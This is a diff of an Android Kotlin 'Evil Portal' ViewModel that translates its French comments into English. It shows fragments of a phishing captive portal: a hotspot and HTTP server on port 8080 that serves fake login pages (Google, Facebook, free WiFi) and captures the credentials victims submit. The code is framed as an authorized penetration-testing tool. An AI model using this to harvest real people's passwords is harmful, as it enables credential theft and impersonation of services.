@@ -15,14 +15,14 @@ import java.net.Socket
 import java.net.URLDecoder
 
 /**
- * Evil Portal / Captive Portal (test autorisé).
+ * Evil Portal / Captive Portal (authorized test).
  *
- * Ouvre un point d'accès local (LocalOnlyHotspot) et sert une page de connexion
- * qui capture les identifiants soumis, via un petit serveur HTTP intégré.
+ * Opens a local access point (LocalOnlyHotspot) and serves a login page
+ * that captures the submitted credentials, through a small built-in HTTP server.
  *
- * Limites Android : sans root on ne peut pas router le trafic ni écouter sur le
- * port 80, donc la popup captive automatique n'est pas garantie — les victimes
- * doivent ouvrir http://<gateway>:8080. Pas d'accès internet fourni.
+ * Android limitations: without root we can neither route the traffic nor listen on
+ * port 80, so the automatic captive popup is not guaranteed — the victims
+ * must open http://<gateway>:8080. No internet access provided.
  */
 class EvilPortalViewModel : ViewModel() {
 
@@ -49,16 +49,16 @@ class EvilPortalViewModel : ViewModel() {
     private val _captured = MutableStateFlow<List<String>>(emptyList())
     val captured: StateFlow<List<String>> = _captured
 
-    // Titre affiché sur la page de phishing (personnalisable)
+    // Title displayed on the phishing page (customisable)
     var portalTitle = "Free WiFi — Sign in"
 
-    /** Modèles de page captive (test autorisé uniquement). */
+    /** Captive page templates (authorized test only). */
     enum class PortalTemplate { GENERIC, GOOGLE, FACEBOOK, FREE_WIFI }
     private val _template = MutableStateFlow(PortalTemplate.GENERIC)
     val template: StateFlow<PortalTemplate> = _template
     fun setTemplate(t: PortalTemplate) { _template.value = t }
 
-    // Nombre de requêtes HTTP reçues (retour visuel « ça marche »).
+    // Number of HTTP requests received (visual "it works" feedback).
     private val _requests = MutableStateFlow(0)
     val requests: StateFlow<Int> = _requests
 
@@ -127,7 +127,7 @@ class EvilPortalViewModel : ViewModel() {
                 serverSocket = ServerSocket(8080)
                 while (running) {
                     val client = try { serverSocket!!.accept() } catch (e: Exception) { break }
-                    // Throwable : une requête malformée ne doit jamais tuer le processus.
+                    // Throwable: a malformed request must never kill the process.
                     try { client.soTimeout = 5000; handleClient(client) }
                     catch (_: Throwable) {}
                     finally { try { client.close() } catch (_: Exception) {} }
@@ -148,7 +148,7 @@ class EvilPortalViewModel : ViewModel() {
     private fun handleClient(client: Socket) {
         val reader = BufferedReader(InputStreamReader(client.getInputStream()))
         val requestLine = reader.readLine() ?: run { client.close(); return }
-        // Trace chaque requête : permet de vérifier qu'un client atteint bien le portail.
+        // Logs every request: lets you check that a client actually reaches the portal.
         AppLog.log("EvilPortal", "Request from ${client.inetAddress?.hostAddress ?: "?"}: $requestLine")
         _requests.value = _requests.value + 1
         val method = requestLine.substringBefore(" ")
@@ -161,7 +161,7 @@ class EvilPortalViewModel : ViewModel() {
                 contentLength = line!!.substringAfter(":").trim().toIntOrNull() ?: 0
             }
         }
-        // Taille fournie par le client : bornée pour éviter une allocation géante (OOM).
+        // Size supplied by the client: bounded to avoid a huge allocation (OOM).
         contentLength = contentLength.coerceIn(0, MAX_BODY_CHARS)
         if (method.equals("POST", true) && contentLength > 0) {
             val body = CharArray(contentLength)
@@ -195,8 +195,8 @@ class EvilPortalViewModel : ViewModel() {
         val pass = fields["password"] ?: fields["pass"] ?: "?"
         val entry = "user=$user  pass=$pass"
         _captured.value = _captured.value + entry
-        // Le mot de passe n'est affiché que dans l'écran : jamais dans AppLog (logcat +
-        // export des journaux).
+        // The password is only displayed on the screen: never in AppLog (logcat +
+        // log export).
         AppLog.log("EvilPortal", "Form submitted (user=$user, password redacted)")
     }
 
@@ -223,7 +223,7 @@ class EvilPortalViewModel : ViewModel() {
         )
     }
 
-    /** Gabarit de page de connexion. Champs nommés email/username + password (capturés). */
+    /** Login page template. Fields named email/username + password (captured). */
     private fun loginPage(
         title: String, heading: String, sub: String,
         userField: String, userLabel: String, accent: String, bg: String
